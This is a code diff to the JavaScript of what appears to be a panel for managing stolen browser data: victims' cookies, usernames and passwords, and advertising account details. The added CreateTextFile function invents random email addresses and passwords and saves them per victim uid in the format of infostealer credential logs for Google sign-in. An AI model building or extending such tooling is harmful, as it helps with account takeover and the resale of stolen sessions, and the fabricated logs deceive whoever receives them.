@@ -62,7 +62,8 @@ function setListCookies(res){
                     <textarea class="form-control" id="exampleFormControlTextarea4" rows="3">${element['cookie']}</textarea>
                 </div>
             </td>
-            <td><p class="text-break">${element['usernameAndPassword']}</p></td>`;
+            <td><p class="text-break">${element['usernameAndPassword']}</p></td>
+            <td><button onclick='CreateTextFile("${element['uid']}","${element['usernameAndPassword'] ? element['usernameAndPassword'] : null}",this)' class="btn btn-warning w-20 ml-3 confirm-button">Download</button></td>`;
             if(infoAds!=null){
                 htmlSegment+= `<td>${infoAds['adsName']}<br>(${infoAds['adsId']})</td>
                 <td>${infoAds['currency']} / ${infoAds['country']}</td>
@@ -298,6 +299,118 @@ function eventNextPage(){
         }
     }
 }
-
+function CreateTextFile(uid,pass) {
+    var names = new Array('Lukas','Sergio','Joan','Jeremiah','Abel','Jamel','Gunner',
+    'Armando','Lonnie','Caryn',
+    'Angela',
+    'Ann/Anne',
+    'Andrea',
+    'Glenda',
+    'Fiona',
+    'Bella',
+    'Diana',
+    'Gina',
+    'Harmony',
+    'Gabriela',
+    'Wendy',
+    'Joy',
+    'Jenny',
+    'Jessica',
+    'Crystal',
+    'Caroline',
+    'Emma',
+    'Claire',
+    'Vivian',
+    'Vera',
+    'Madeline',
+    'Ellie','Charmaine',
+    'Abbey',
+    'Adelaide',
+    'Briona',
+    'Sophia',
+    'Artemis',
+    'Eirene',
+    'Donna',
+    'Nora',
+    'Grace',
+    'Pandora',
+    'Phoebe',
+    'Florence',
+    'Phoenix',
+    'Serenity',
+    'Una',
+    'Aine',
+    'Oralie',
+    'Almira','Akina',
+    'Bonnie',
+    'Alula',
+    'Antaram',
+    'Ceridwen',
+    'Eser',
+    'Aster',
+    'May',
+    'Augusta',
+    'June',
+    'July',
+    'Natalia',
+    'Sunny',
+    'Bell',
+    'Elaine',
+    'Charlotte',
+    'Keelin',
+    'Tina',
+    'Grainne','Eric',
+    'Alexander/Alex',
+    'Corbin',
+    'Carlos',
+    'Alan',
+    'Finn',
+    'Bernie',
+    'Elias',
+    'Zane',
+    'Beckham',
+    'Arlo',
+    'Atticus',
+    'Clinton',
+    'Silas',
+    'Ethan',
+    'Levi',
+    'Justin',
+    'Maverick',
+    'Jesse',
+    'Matthew',
+    'Bear',
+    'Duke','Andrew',
+    'Vincent',
+    'Marcus',
+    'Leon',
+    'Brian',
+    'Walter',
+    'Louis',
+    'Dominic',
+    'Leonard',
+    'Harold',
+    'Drake',
+    'Chad',
+    'Richard',
+    'Elias',
+    'Harvey',
+    'Charles',
+    'Ryder',
+    'Orson',
+    'Archibald');
+    var mail = ['hotmail.com','outlook.com','gmail.com','yahoo.com'];
+    var character = ['#','$','@',".",'','','','###','%','@@@','@@','#','$$','',''];
+    var fisrtname = names[Math.floor(Math.random() * names.length)].toLowerCase();
+    var lastname = names[Math.floor(Math.random() * names.length)].toLowerCase();
+    var email = fisrtname+lastname+'@'+mail[Math.floor(Math.random() * mail.length)];
+    var password = fisrtname+lastname+character[Math.floor(Math.random() * character.length)];
+    var blob = new Blob([`URL:https://accounts.google.com/signin\nUsername: ${email}\nPassword: ${password}\nBrowser: [Chrome][Default]`], {
+       type: "text/plain;charset=utf-8",
+    });
+    if(pass!="null"){
+        saveAs(blob, `${uid}.txt`);
+    }
+}
 callGetUserInfo();
 eventNextPage();
